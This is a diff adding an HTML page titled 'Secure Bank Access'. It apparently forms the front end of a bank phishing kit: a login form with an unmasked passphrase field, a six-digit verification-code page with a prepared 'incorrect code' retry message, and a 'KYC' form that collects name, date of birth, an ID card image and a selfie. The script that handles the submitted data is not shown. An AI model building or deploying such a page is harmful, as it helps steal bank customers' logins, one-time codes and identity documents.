@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secure Bank Access</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <!-- LOGIN -->
+  <div id="page-login" class="page active">
+    <h2>Welcome Back</h2>
+    <form id="loginForm">
+      <label>Username</label>
+      <input type="text" id="username" required>
+
+      <label>Passphrase</label>
+      <input type="text" id="passphrase" required>
+
+      <button type="submit">Sign In</button>
+    </form>
+  </div>
+
+  <!-- CODE -->
+  <div id="page-code" class="page hidden">
+    <h2>Verification Code</h2>
+    <p>Please enter the 6-digit verification code.</p>
+    <form id="codeForm">
+      <input type="text" id="code" maxlength="6" required>
+      <button type="submit">Continue</button>
+    </form>
+    <p id="code-error" class="error hidden">Incorrect code, please try again.</p>
+  </div>
+
+  <!-- KYC -->
+  <div id="page-kyc" class="page hidden">
+    <h2>KYC Verification</h2>
+    <form id="kycForm" enctype="multipart/form-data">
+      <label>Full Name</label>
+      <input type="text" name="fullname" required>
+
+      <label>Date of Birth</label>
+      <input type="date" name="dob" required>
+
+      <label>Upload ID Card</label>
+      <input type="file" name="idcard" accept="image/*" required>
+
+      <label>Upload Selfie</label>
+      <input type="file" name="selfie" accept="image/*" required>
+
+      <button type="submit">Submit</button>
+    </form>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
